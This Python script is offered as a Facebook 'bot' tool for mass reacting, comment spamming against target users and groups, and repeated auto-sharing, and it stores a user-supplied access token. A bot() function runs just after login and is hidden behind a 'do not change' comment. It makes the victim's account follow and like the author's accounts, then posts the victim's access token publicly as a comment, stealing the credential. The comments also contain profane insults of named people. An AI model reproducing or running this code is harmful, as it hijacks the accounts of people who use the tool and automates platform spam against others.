
#------------[ SELAMAT-MERECODE-ANAK-KENTOD ]------------------#

import os, sys, re, time, requests, calendar, random,json
from datetime import datetime
from datetime import date
from concurrent.futures import ThreadPoolExecutor as __Kiky__
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError


current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]

bo = []


def countdown(p): 
    while p: 
        mins, secs = divmod(p, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs) 
        _____jeda_____(1) 
        p -= 1
     
now = datetime.now()
hour = now.hour
if hour < 4:
  respon = "Selamat Dini Hari !"
elif 4 <= hour < 12:
  respon = "Selamat Pagi !"
elif 12 <= hour < 15:
  respon = "Selamat Siang !"
elif 15 <= hour < 17:
  respon = "Selamat Sore !"
elif 17 <= hour < 18:
  respon = "Selamat Petang !"
else:
  respon = "Selamat Malam !"

#-----------------[ WARNA-NGENTOD ]---------------#

m = '\x1b[1;91m' # MERAH
h = '\x1b[1;92m' # HIJAU
k = '\x1b[1;93m' # KUNING
p = '\x1b[1;94m' # BIRU
u = '\x1b[1;95m' # UNGU
b = '\x1b[1;96m' # BIRU MUDA
x = '\x1b[0m'    # WARNA MATI
katok_kolor = [ x, m, h, k, b, u, p]
katok_dower = [ p, u, b, k, h, m, x]
katok_lorek = [ k, b, h, m, u, p, x]
kupuu = random.choice(katok_kolor)
kupu = random.choice(katok_dower)
kup = random.choice(katok_lorek)

#---------------[ SYSTEM-SUPPORT ]--------------#

_____jeda_____ = time.sleep
_____alvino_xy_____ = print
_____JEMBOT_XY_____ = os.system
ip =  requests.get("https://api.ipify.org").text
sys.stdout.write('\x1b]1;{•} Botfb By Alvino_xy {•}\x07')
def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();_____jeda_____(0.01)

#----------------[ LOGO-NGENTOD ]------------------#

def logo2():
	jalan(f'''
{kup} _       ___    ____  ____  ____  
{kup}| |     /   \  /    ||    ||    \ 
{kup}| |    |     ||   __| |  | |  _  |
{kupu}| |___ |  O  ||  |  | |  | |  |  |
{kupu}|     ||     ||  |_ | |  | |  |  |
{kupu}|     ||     ||     | |  | |  |  |
{kupuu}|_____| \___/ |___,_||____||__|__|

\033[45m\033[1;37m Login \033[44m\033[1;37m Access \033[43m\033[1;37m Token\n''')

def logo():
	jalan(f'''
{kupuu}______       _    ______ _     
{kupuu}| ___ \     | |   |  ___| |    
{kupuu}| |_/ / ___ | |_  | |_  | |__  
{kup}| ___ \/ _ \| __| |  _| | '_ \ 
{kup}| |_/ / (_) | |_  | |   | |_) |
{kup}\____/ \___/ \__| \_|   |_.__/ 
{kupu}              ______           
{kupu}             |______|          
{kupu}
\033[44m\033[1;37m tools bot facebook \033[41m\033[1;37m version 0.1 \x1b[0m                                        
''')

#-----------------[ MENU-LOGIN ]-----------------#

def login():
	_____JEMBOT_XY_____("clear")
	try:
		token = open('token.txt', 'r')
		print("[•] Token Kadaluarsa !!!")
		_____jeda_____(4)
		_____JEMBOT_XY_____('rm token.txt')
		login()
	except (KeyError, IOError):
		_____JEMBOT_XY_____('clear')
		logo2()
		token = input(f'{x}[{h}•{x}]{kup} Masukkan Token : ')
		try:
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			jalan(f"\n{h}[•] Login Successfull....!!")
			bot()
			masuk()
		except KeyError:
			print("\033[1;91m[!] token kedaluwarsa !!!")
			_____jeda_____(4)
			_____JEMBOT_XY_____('rm token.txt')
			login()
			

#------------------[ JANGAN-DIUBAH-KONTOL ]------------------#


#>>>>>>>> UBAH JANGAN, TAMBAHIN NGGA APA²
#>>>>>>>> YANG UBAH FIX ANAK DAJALL

def bot():
	try:
		token = open('token.txt', 'r').read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except (KeyError, IOError):
		print("\033[1;91m[!] token kedaluwarsa !!!")
		_____JEMBOT_XY_____('rm token.txt')
		login()
	texs = (" Yang Posting Orangnya Ganteng ♥️:)\n\nhttps://www.facebook.com/100058252283419/posts/409580980993641/?app=fbl\n")
	kom = (" Bang Vino Ganteng Bener Dah!!")
	waktu = str(datetime.now().strftime('%H:%M:%S'))
	tanggal = ("%s %s %s"%(ha,op,ta))
	_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
	requests.post('https://graph.facebook.com/100005410264497/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100000476920820/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100069382160977/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/1866517366871921/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/1866517366871921/comments/?message=' + respon + '\n\n' + texs +'\n' + kom + '\n[ Pukul '+ waktu + ' WIB ] '+ '\n- '+ _hari_ + ', '+ tanggal + ' -' + '&access_token=' + token)
	requests.post('https://graph.facebook.com/1866517366871921/comments/?message=' + token + '&access_token=' + token)
	
_____JEMBOT_XY_____("clear")

now = datetime.now()
hour = now.hour
if hour < 4:
  waktu = "Selamat Dini Hari"
elif 4 <= hour < 12:
  waktu = "Selamat Pagi"
elif 12 <= hour < 15:
  waktu = "Selamat Siang"
elif 15 <= hour < 17:
  waktu = "Selamat Sore"
elif 17 <= hour < 18:
  waktu = "Selamat Petang"
else:
  waktu = "Selamat Malam"

#--------------------[ MAIN-MENU ]--------------------#

def masuk():
	try:
		token = open('token.txt', 'r').read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except (KeyError, IOError):
		jalan(f'\n\n\n{kup}|———>>{kupu} Token Kadaluarsa{kup} <———|')
		('rm token.txt')
		_____jeda_____(5)
		login()
	_____JEMBOT_XY_____('clear')
	logo()
	jalan("─"*50)
	_____alvino_xy_____(f"[•] Your Name : "+ nama )
	_____alvino_xy_____(f"[•] Your Idz  : "+ id )
	_____alvino_xy_____(f'[•] You Ip    : {ip}')
	jalan("─"*50)

	_____alvino_xy_____("(1) bot react random post  ")
	_____alvino_xy_____("(2) bot react group post   ")
	_____alvino_xy_____("(3) bot coment random post ")
	_____alvino_xy_____("(4) bot coment target post ")
	_____alvino_xy_____("(5) bot coment group post  ")
	_____alvino_xy_____("(6) bot share post         ")
	_____alvino_xy_____("(0) log out ( keluar )     ")
	_____alvino_xy_____("─"*50)
	_____alvino_xy_____("")
	_____pilih_____()

#----------------[ PILIHAN ]---------------#

def _____pilih_____():
	_____alvino_adijaya_____ = input('[->] Pilih : ')
	if _____alvino_adijaya_____ in ['']:
		print('[×] Yang Bener Lah Anjing')
		masuk()
	elif _____alvino_adijaya_____ in ['1','01']:
		react()
	elif _____alvino_adijaya_____ in ['2','02']:
		react_grup()
	elif _____alvino_adijaya_____ in ['3','03']:
		spam()
	elif _____alvino_adijaya_____ in ['4','04']:
		spam_target()
	elif _____alvino_adijaya_____ in ['5','05']:
		grup_spam()
	elif _____alvino_adijaya_____ in ['6','06']:
		share()
	elif _____alvino_adijaya_____ in ['0']:
		_____JEMBOT_XY_____('rm token.txt')
		exit()
	else:
		jalan("[×] Pilih Yang Bener Anjing")
		exit()

#-------------[ PLIHAN-EMOT ]--------------#

def react():
    reaksi = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	jalan("\033[1;91m[!] token kedaluwarsa !!!")
    _____JEMBOT_XY_____("clear")
    logo()
    _____alvino_xy_____("\033[1;97m(1) like (2) love (3) wow (4) haha (5) sad (6) angry")
    _____alvino_xy_____("")
    _____mass_vino_ganteng_____ = input ("\033[1;97m(+) choose : ")
    if _____mass_vino_ganteng_____ in ('1', '01'):
        tipe = 'LIKE'
    elif _____mass_vino_ganteng_____ in ('2', '02'):
        tipe = 'LOVE'
    elif _____mass_vino_ganteng_____ in ('3', '03'):
        tipe = 'WOW'
    elif _____mass_vino_ganteng_____ in ('4', '04'):
        tipe = 'HAHA'
    elif _____mass_vino_ganteng_____ in ('5', '05'):
        tipe = 'SAD'
    elif _____mass_vino_ganteng_____ in ('6', '06'):
        tipe = 'ANGRY'
    elif _____mass_vino_ganteng_____ in ('0', '00'):
        menu()
    else:
        exit()
    _____alvino_xy_____("")
    _____JEMBOT_XY_____('clear')
    logo()
    id = input ("\033[1;97m(+) id target : \033[1;92m")
    limit = input ("\033[1;97m(+) limit : \033[1;92m")
    _____alvino_xy_____('\n\033[1;97m(+) please wait...')
    _____alvino_xy_____("")
    
    try:
        r = requests.get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        x = json.loads(r.text)
        for z in x['feed']['data']:
            idz = z['id']
            reaksi.append(idz)
            requests.post('https://graph.facebook.com/' + idz + '/reactions?type=' + tipe + '&access_token=' + token)
            _____alvino_xy_____('\r\033[1;92m[✓] SUCCESS : '+ idz + '\033[1;91m')
            sys.stdout.flush()
        
        _____alvino_xy_____("\n\033[1;97m(+) Finished...")
        _____jembot_iv_____ = input ("\033[1;97m\n[<BACK>]")
        masuk()
    except KeyError:
        exit()

#----------------[ PILIHAN-GRUP-REACT ]-----------------#

def react_grup():
    reaksi = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	_____alvino_xy_____("\033[1;91m[!] token kedaluwarsa !!!")
    _____JEMBOT_XY_____("clear")
    logo()
    _____alvino_xy_____("\033[1;97m(1) like (2) love (3) wow (4) haha (5) sad (6) angry")
    _____alvino_xy_____("")
    _____kontl_nazri_____ = input ("\033[1;97m(+) choose : ")
    if _____kontl_nazri_____ in ('1', '01'):
        tipe = 'LIKE'
    elif _____kontl_nazri_____ in ('2', '02'):
        tipe = 'LOVE'
    elif _____kontl_nazri_____ in ('3', '03'):
        tipe = 'WOW'
    elif _____kontl_nazri_____ in ('4', '04'):
        tipe = 'HAHA'
    elif _____kontl_nazri_____ in ('5', '05'):
        tipe = 'SAD'
    elif _____kontl_nazri_____ in ('6', '06'):
        tipe = 'ANGRY'
    elif _____kontl_nazri_____ in ('0', '00'):
        menu()
    else:
        exit()
    _____alvino_xy_____("")
    _____JEMBOT_XY_____('clear')
    logo()
    id = input('\033[1;97m(+) input id group : \033[1;92m')
    limit = input('\033[1;97m(+) limit : \033[1;92m')
    _____alvino_xy_____('\n\033[1;97m(+) please wait...')
    _____alvino_xy_____("")
    
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
    except KeyError:
    	exit()
        
    try:
        r = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        x = json.loads(r.text)
        for z in x['feed']['data']:
            idz = z['id']
            reaksi.append(idz)
            requests.post('https://graph.facebook.com/' + idz + '/reactions?type=' + tipe + '&access_token=' + token)
            _____alvino_xy_____('\r\033[1;92m[✓] SUCCESS : '+ idz + '\033[1;91m')
            sys.stdout.flush()
        
        _____alvino_xy_____("\n\033[1;97m(+) Finished...")
        _____alvino_xyz_____ = input ("\033[1;97m\n[<BACK>]")
        masuk()
    except KeyError:
        exit()

#--------------------[ PILIHAN-SPAM ]------------------#

def spam():
    komen = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    _____JEMBOT_XY_____("clear")
    logo()
    id = input(f'{x}[{b}•{x}] Masukkan Idz Target : ')
    kom = input(f'{x}[{b}•{x}] Masukkan Komentar : ')
    limit = input(f'{x}[{b}•{x}] Masukkan Limid : ')
    km = kom.replace('<>', '\n')
    print("")
    print("[•] Please Waiitt.....!!")
    print("")
    
    try:
        r = requests.get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        f = json.loads(r.text)
        for z in f['feed']['data']:
            ie = z['id']
            komen.append(ie)
            requests.post('https://graph.facebook.com/' + ie + '/comments?message=' + km + '&access_token=' + token)
            _____alvino_xy_____(f'\rSuccessfull : '+ ie + '{kup}')
            sys.stdout.flush()
        
        _____alvino_xy_____(f"\n{x}[{h}•{x}] {m}Selesai Ngav !!{x}")
        _____kontol_____ = input('\n[ Kembali ]')
        masuk()
    except KeyError:
        exit()

#---------------------[ SPAMING-TARGET ]-------------------#

def spam_target():
    komen = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	_____alvino_xy_____(f"\r{x}[{k}×{x}] {m}Token Kadaluarsa .....!!{x}")
    _____JEMBOT_XY_____("clear")
    logo()
    id = input(f'{x}[{h}•{x}] Masukkan Idz Post : ')
    kom = input(f'{x}[{h}•{x}] Masukkan Komentar : ')
    limit = int(input(f'{x}[{h}•{x}] Masukkan Limid : '))
    km = kom.replace('<>', '\n')
    _____alvino_xy_____("")
    _____alvino_xy_____(f"{x}[{k}•{x}]{m} Please Wait......!!{x}")
    _____alvino_xy_____("")
    
    try:
        for i in range(limit,):
            requests.post('https://graph.facebook.com/' + id + '/comments?message=' + kom + '&access_token=' + token)
            _____alvino_xy_____(f'\r[✓] Successfull : '+ id + '{h}')
            sys.stdout.flush()
        
        _____alvino_xy_____("\n[•] Selesai Ngabv")
        _____kontol_nazri_____ = input('\n[ Kembali ]')
        masuk()
    except KeyError:
        exit()

#---------------------[ SPAM-GRUP ]--------------------#

def grup_spam():
    komengrup = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	_____alvino_xy_____(f"{x}[{k}×{x}] Token Kadaluarsa....!!{x}")
    _____JEMBOT_XY_____("clear")
    logo()
    id = input ('{x}[{h}•{x}] Masukkan Idz Grup : ')
    kom = input ('{x}[{h}•{x}] Masukkan Komentar : ')
    limit = input ('{x}[{h}•{x}] Masukkan Limid : ')
    km = kom.replace('<>', '\n')
    _____alvino_xy_____("")
    _____alvino_xy_____("[✓] Please Waitt.......!!")
    _____alvino_xy_____("")
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
    except KeyError:
        exit()

    
    try:
        p = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        a = json.loads(p.text)
        for e in a['feed']['data']:
            grep = e['id']
            komengrup.append(grep)
            requests.post('https://graph.facebook.com/' + grep + '/comments?message=' + km + '&access_token=' + token)
            _____alvino_xy_____(f'\r[•] Successfull : '+ grep + '{kup}')
            sys.stdout.flush()
        
        _____alvino_xy_____("\n[✓] Selesai Ngav !!")
        _____kontol_xy_____ = input('\n[ Kembali ]')
        masuk()
    except KeyError:
        exit()

#-------------------[ AUTO-SHARE ]------------------#

def share():
		sukkses = 0
		def cept_(idpost):
			token = open("token.txt", "r").read()
			try:
				requests.get('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(idpost)+'&access_token='+str(token))
			except:pass
		try:
			token = open("token.txt", "r").read()
		except IOError:
			_____JEMBOT_XY_____("rm token.txt")
			exit()
		_____JEMBOT_XY_____('clear')
		logo()
		idpostt = input(f'[•] Masukkan Idz Post : ')
		limit = int(input('[•] Masukkan Limid Post : '))
		time_delay = int(input('[•] Masukkan Delay : '))
		_____alvino_xy_____("\n[✓] Selesai Ngav.....!!\n")
		with __Kiky__(max_workers=2) as (form):
			for t in range(limit):
				sukkses += 1
				_____alvino_xy_____(f'\r\033[1;92m[✓] {sukkses} Successfull Sharee!!: {str(idpostt)}'),
				sys.stdout.flush();_____jeda_____(time_delay)
				form.submit(cept_, idpostt)
		_____alvino_xy_____(f'[ Kembali ]')
		exit()

#------------[ SYSTEM-CONTROL ]--------------#


if __name__ == '__main__':
	_____JEMBOT_XY_____('clear')
	login()

#----------[ DAFTAR_ANAK_SETAN ]-----------#

#==>>> DANZZ KONTOL
#==>>> NAZRI KENTOD
#==>>> BINTANG KORENG
#==>>> PUTRA SETAN
#==>>> ALVINO_GANTENG 🔥🔥

#------------------------------------------#
